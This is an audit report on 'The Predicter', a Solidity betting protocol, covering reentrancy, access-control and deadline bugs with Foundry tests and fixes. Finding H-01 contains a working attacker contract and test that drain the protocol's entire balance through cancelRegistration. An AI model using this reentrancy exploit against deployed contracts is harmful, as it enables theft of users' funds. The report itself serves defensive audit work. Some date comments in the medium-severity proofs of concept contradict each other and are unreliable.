<table>
    <tr><th></th><th></th></tr>
    <tr>
        <td><img src="../assets/the-predicter.png" width="250" height="250" /></td>
        <td>
            <h1>First Flight #20: The Predicter</h1>
            <h2>Competitive betting protocol</h2>
            <p>Prepared by: 0xjoaovictor</p>
            <p>Date: July 25 2024</p>
        </td>
    </tr>
</table>

# About **First Flight #20: The Predicter**

The Predicter is an innovative competitive betting protocol offering a decentralized and fair way for friends and strangers to make wagers!

# Summary & Scope

```solidity
├── src
│   ├── Scoreboard.sol
│   ├── ThePredicter.sol
```

## Compatibilities

* Solc Version: `0.8.20`
* Chain(s) to deploy contract to:
  * Arbitrum

# Summary of Findings

| ID     | Title                        | Severity      | Fixed |
| ------ | ---------------------------- | ------------- | ----- |
| [H-01] | Reentrancy attack on `ThePredicter:cancelRegistration` | High | ✓ |
| [H-02] | Users without approval by organizer and paid entry fee can make prediction on `ThePredicter::makePrediction`| High | ✓ |
| [H-03] | Players can change the prediction of the other players | High | ✓ |
| [H-04] | `ScoreBoard::isEligibleForReward` has a invalid verification that the user may lose the reward | High | ✓ |
| [M-01] | Incorrect verification of deadline to make prediction in the `ThePredicter::makePrediction` | Medium | ✓ |
| [M-02] | Incorrect verification of deadline to set prediction in the `ScoreBoard::setPrediction` | Medium | ✓ |

# Detailed Findings

## [H-01] Reentrancy attack on `ThePredicter:cancelRegistration`

### Description

The function `ThePredicter:cancelRegistration` is available to receive a reentrancy attack and lost all your funds

### Impact

The protocol could be drained and the users will lost all your funds

### Proof Of Concept:

In the `test/` create the `ReentrancyAttackOnCancelRegistration.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface ThePredicter {
    function cancelRegistration() external;
}

contract ReentrancyAttackOnCancelRegistration {

    constructor(address _thePredicter) {
        thePredicter = ThePredicter(_thePredicter);
    }

    ThePredicter public thePredicter;

    receive() external payable {
        if(address(thePredicter).balance >= 0.04 ether) {
            thePredicter.cancelRegistration();
        }
    }

}
```

In the `test/ThePredicter.test.sol` import the `ReentrancyAttackOnCancelRegistration`:

```diff
    import {Test, console} from "forge-std/Test.sol";
    import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
    import {ThePredicter} from "../src/ThePredicter.sol";
    import {ScoreBoard} from "../src/ScoreBoard.sol";
+   import { ReentrancyAttackOnCancelRegistration } from "./ReentrancyAttackOnCancelRegistration.sol";
```

And add the test:

```solidity
function test_ReentracyAttackOnCancelRegistration() public {
        // setup stranger users
        address stranger1 = makeAddr("stranger1");
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.deal(stranger1, 1 ether);
        vm.deal(stranger2, 1 ether);
        vm.deal(stranger3, 1 ether);

        // register stranger users
        vm.startPrank(stranger1);
        thePredicter.register{value: 0.04 ether}();
        vm.startPrank(stranger2);
        thePredicter.register{value: 0.04 ether}();
        vm.startPrank(stranger3);
        thePredicter.register{value: 0.04 ether}();

        // check thePredicter balance
        assertEq(address(thePredicter).balance, 0.12 ether);

        // setup ReentracyAttackOnCancelRegistration
        ReentrancyAttackOnCancelRegistration reentrancyAttackOnCancelRegistration = new ReentrancyAttackOnCancelRegistration(address(thePredicter));
        address addressReentrancyAttackOnCancelRegistration = address(reentrancyAttackOnCancelRegistration);
        vm.startPrank(addressReentrancyAttackOnCancelRegistration);
        vm.deal(addressReentrancyAttackOnCancelRegistration, 1 ether);

        // reentracy attack on cancel registration
        thePredicter.register{value: 0.04 ether}();
        thePredicter.cancelRegistration();

        // check balances
        assertEq(address(thePredicter).balance, 0 ether);
        assertEq(addressReentrancyAttackOnCancelRegistration.balance, 1.12 ether);
    }
```

Run with: `forge test --match-test test_ReentracyAttackOnCancelRegistration -vvvv`

### Recommended Mitigation:

Update the status of the player to canceled before sending the entry fee.

```diff
    function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
+           playersStatus[msg.sender] = Status.Canceled;
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
-           playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

## [H-02] Users without approval by organizer and paid entry fee can make prediction on `ThePredicter::makePrediction`

### Description

Users without approval by organizer and paid entry fee can make prediction on `ThePredicter::makePrediction`

### Impact

An stranger user that don't pay the entry fee to register and was not approved can make a prediction and play with the others approved users that paid the entry fee

### Proof of Concept

Add the following code to the `test/ThePredicter.test.sol`:

```diff
contract ThePredicterTest is Test {
    error ThePredicter__NotEligibleForWithdraw();
    error ThePredicter__CannotParticipateTwice();
    error ThePredicter__RegistrationIsOver();
    error ThePredicter__IncorrectEntranceFee();
    error ThePredicter__IncorrectPredictionFee();
    error ThePredicter__AllPlacesAreTaken();
    error ThePredicter__PredictionsAreClosed();
+   error ThePredicter__UnauthorizedAccess();
```

```solidity
    function test_UsersWithoutApprovalCanNotMakePrediction() public {
        // setup strange user
        vm.deal(stranger, 1 ether);

        // stranger try to make prediction without registration
        vm.startPrank(stranger);
        vm.expectRevert({
            revertData: abi.encodeWithSelector(
                ThePredicter__UnauthorizedAccess.selector
            )
        });
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.First
        );
    }
```

Run with: `forge test --match-test test_UsersWithoutApprovalCanNotMakePrediction -vvv`

### Recommended Mitigation

Add the check in the `ThePredicter::makePrediction`:

```diff
    function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
+       if (playersStatus[msg.sender] != Status.Approved) {
+           revert ThePredicter__UnauthorizedAccess();
+       }
...
```

## [H-03] Players can change the prediction of the other players

### Description

Players can change the prediction of the other players

### Impact

A player can make a prediction of a match and other random player can change your prediction without permission

### Proof Of Concept

Add the following code to the `test/ThePredicter.test.sol`:

```solidity
    function test_OnlyThePredicterAndUserAuthenticatedCanSetPredictions() public {
        // setup stranger 1
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();

        // setup stranger 2
        address stranger2  = makeAddr("stranger2");
        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();

        // accept stranger 1 and stranger 2
        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);

        // stranger 1 sets prediction
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.First
        );

        // stranger 2 try change the stranger 1 prediction
        vm.startPrank(stranger2);
        vm.expectRevert({
            revertData: abi.encodeWithSelector(
                ScoreBoard__UnauthorizedAccess.selector
            )
        });
        scoreBoard.setPrediction(stranger, 0, ScoreBoard.Result.Second);
    }
```

Run with: `forge test --match-test test_OnlyThePredicterAndUserAuthenticatedCanSetPredictions`

### Recommended Mitigation

Add this check on `ScoreBoard::setPrediction`:

```diff
    function setPrediction(
        address player,
        uint256 matchNumber,
        Result result
    ) public {
+        if (msg.sender != thePredicter && msg.sender != player) {
+            revert ScoreBoard__UnauthorizedAccess();
+        }

        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400)
            playersPredictions[player].predictions[matchNumber] = result;
        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (
                playersPredictions[player].predictions[i] != Result.Pending &&
                playersPredictions[player].isPaid[i]
            ) ++playersPredictions[player].predictionsCount;
        }
    }
```

## [H-04] `ScoreBoard::isEligibleForReward` has a invalid verification that the user may lose the reward

### Description

The function `ScoreBoard::isEligibleForReward` has a invalid verification that the user may lose the reward because verify if user has a more than one prediction fee (> 1), but in the docs the user could be at least one prediction fee (>=1), as we can se below:

```solidity
    function isEligibleForReward(address player) public view returns (bool) {
        return
            results[NUM_MATCHES - 1] != Result.Pending &&
            playersPredictions[player].predictionsCount > 1; //here
    }
```

### Impact

If the player has only one prediction fee paid he will not win the rewards and loss the prize.

### Recommended Mitigation

In the `src/ScoreBoard.sol` update the function check:

```diff
    function isEligibleForReward(address player) public view returns (bool) {
        return
            results[NUM_MATCHES - 1] != Result.Pending &&
-           playersPredictions[player].predictionsCount > 1;
+           playersPredictions[player].predictionsCount >= 1;
    }
```

## [M-01] Incorrect verification of deadline to make prediction in the `ThePredicter::makePrediction`

### Description

The function `ThePredicter::makePrediction` has a incorret verification of deadline to make prediction

### Impact

The players may not be able to make predictions and the platform will not receive the predictions

### Proof Of Concept

```JavaScript
// simulate with the match number 1
let time = 1723752000 + 0 * 68400 - 68400
// time: 1723683600
let date = new Date(time * 1000);
// date: Wed Aug 15 2024 01:00:00
// but the output needs to be: Wed Aug 15 2024 19:00:00

// simulate with the match number 2
let time = 1723752000 + 1 * 68400 - 68400
// time: 1723752000
let date = new Date(time * 1000);
// date: Thu Aug 15 2024 20:00:00
// but the output needs to be: Wed Aug 16 2024 19:00:00
```

### Recommended Mitigation

Fix the check in the `ThePredicter::makePrediction`:

```diff
    function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

+       if (block.timestamp > START_TIME + matchNumber * 86400 - 3600) {
+           revert ThePredicter__PredictionsAreClosed();
+       }

-       if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
-           revert ThePredicter__PredictionsAreClosed();
-       }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

## [M-02] Incorrect verification of deadline to set prediction in the `ScoreBoard::setPrediction`

### Description

The function `ScoreBoard::setPrediction` has a incorret verification of deadline to set prediction

### Impact

The players may not be able to set predictions and the platform will not receive the predictions

### Proof Of Concept

```JavaScript
// simulate with the match number 1
let time = 1723752000 + 0 * 68400 - 68400
// time: 1723683600
let date = new Date(time * 1000);
// date: Wed Aug 15 2024 01:00:00
// but the output needs to be: Wed Aug 15 2024 19:00:00

// simulate with the match number 2
let time = 1723752000 + 1 * 68400 - 68400
// time: 1723752000
let date = new Date(time * 1000);
// date: Thu Aug 15 2024 20:00:00
// but the output needs to be: Wed Aug 16 2024 19:00:00
```

### Recommended Mitigation

Fix the check in the `ScoreBoard::setPrediction`:

```diff
    function setPrediction(
        address player,
        uint256 matchNumber,
        Result result
    ) public {

+       if (block.timestamp <= START_TIME + matchNumber * 86400 - 3600)
+           playersPredictions[player].predictions[matchNumber] = result;

-       if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400)
-           playersPredictions[player].predictions[matchNumber] = result;

        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (
                playersPredictions[player].predictions[i] != Result.Pending &&
                playersPredictions[player].isPaid[i]
            ) ++playersPredictions[player].predictionsCount;
        }
    }
```